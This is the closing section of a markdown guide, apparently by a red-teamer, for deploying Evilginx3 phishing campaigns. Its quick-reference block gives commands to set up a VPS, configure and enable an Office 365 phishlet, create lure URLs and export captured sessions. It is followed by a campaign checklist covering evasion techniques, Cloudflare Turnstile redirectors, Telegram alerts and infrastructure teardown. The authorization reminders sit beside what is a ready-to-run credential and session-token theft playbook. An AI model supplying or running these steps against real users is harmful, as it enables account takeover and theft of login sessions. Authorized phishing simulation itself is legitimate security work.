- [TRAINING NEEDS]
- [TECHNICAL CONTROLS]

## Evidence
- [ATTACHED SCREENSHOTS]
- [LOG EXCERPTS]
- [SESSION EXPORTS]
```

---

## 📊 Quick Reference

### Essential Commands

```bash
# VPS Setup
ssh root@YOUR_VPS_IP
sudo apt update && sudo apt upgrade -y
sudo ufw allow 22,53,80,443/tcp
sudo ufw allow 53/udp
sudo ufw enable

# Evilginx Installation
cd ~/phishing/Evilginx3
sudo ./install.sh

# Evilginx Console
sudo systemctl stop evilginx
sudo evilginx

# Configuration
config domain yourdomain.com
config ip YOUR_VPS_IP
phishlets hostname o365 yourdomain.com
phishlets enable o365

# Lure Creation
lures create o365
lures get-url 0

# Session Management
sessions
sessions 0
sessions export 0 /root/session.json

# Monitoring
sudo systemctl status evilginx
sudo journalctl -u evilginx -f
```

### Port Reference

```
22  - SSH
53  - DNS (TCP/UDP)
80  - HTTP (ACME challenges)
443 - HTTPS (Phishing traffic)
```

### File Locations

```
/usr/local/bin/evilginx           - Binary
/root/.evilginx/                  - Data directory
/root/.evilginx/phishlets/        - Phishlets
/root/.evilginx/redirectors/      - Redirectors
/root/.evilginx/certs/            - SSL certificates
/root/.evilginx/logs/             - Log files
/etc/systemd/system/evilginx.service - Service file
```

---

## 🎯 Campaign Checklist

**Pre-Deployment:**
- [ ] VPS configured and secured
- [ ] Domain registered with privacy enabled
- [ ] DNS configured (Cloudflare)
- [ ] Evilginx installed and tested
- [ ] SSL certificates generated
- [ ] Phishlet configured and enabled
- [ ] Redirector deployed with Turnstile
- [ ] Lures created and tested
- [ ] Telegram notifications configured
- [ ] Evasion techniques enabled
- [ ] Authorization documentation obtained

**During Campaign:**
- [ ] Monitor sessions in real-time
- [ ] Export captured data regularly
- [ ] Respond to notifications
- [ ] Adjust evasion settings as needed
- [ ] Track success metrics
- [ ] Document findings

**Post-Campaign:**
- [ ] Export all session data
- [ ] Encrypt sensitive data
- [ ] Clean up VPS
- [ ] Destroy infrastructure
- [ ] Delete domains/redirectors
- [ ] Generate engagement report
- [ ] Deliver findings to client
- [ ] Securely destroy temporary data

---

## 🛡️ Legal & Ethical Reminder

```
⚠️ CRITICAL REMINDERS:

1. ALWAYS obtain written authorization
2. Define clear scope and boundaries
3. Follow data protection regulations
4. Maintain client confidentiality
5. Destroy data per retention policy
6. Report findings professionally
7. Never exceed authorized scope
8. Comply with local laws

UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL
```

---

## 📚 Additional Resources

**Documentation:**
- Original Evilginx2: https://github.com/kgretzky/evilginx2
- Cloudflare Turnstile: https://developers.cloudflare.com/turnstile/
- Let's Encrypt: https://letsencrypt.org/docs/
- Phishing Frameworks: https://github.com/topics/phishing

**Security Research:**
- Red Team Tactics: https://attack.mitre.org/
- Social Engineering: https://www.social-engineer.org/
- OSINT Techniques: https://osintframework.com/

**Communities:**
- r/redteamsec
- r/netsec
- DEFCON Groups
- Local BSides events

---

## 📝 Conclusion

This comprehensive guide provides everything needed to deploy Evilginx3 campaigns from initial VPS setup through post-engagement cleanup. Remember:

- **Security First**: Always operate within authorized scope
- **OPSEC Matters**: Protect your infrastructure and identity
- **Document Everything**: Maintain detailed logs for reporting
- **Stay Updated**: Security landscape evolves rapidly
- **Be Ethical**: Use these tools responsibly

**Questions or Issues?**
- Check troubleshooting section
- Review Evilginx logs
- Test in controlled environment first
- Consult with experienced red teamers

---

**Version:** 1.0.0  
**Last Updated:** November 22, 2025  
**Author:** AKaZA (Akz0fuku)  

**Happy (Authorized) Hunting! 🎣**
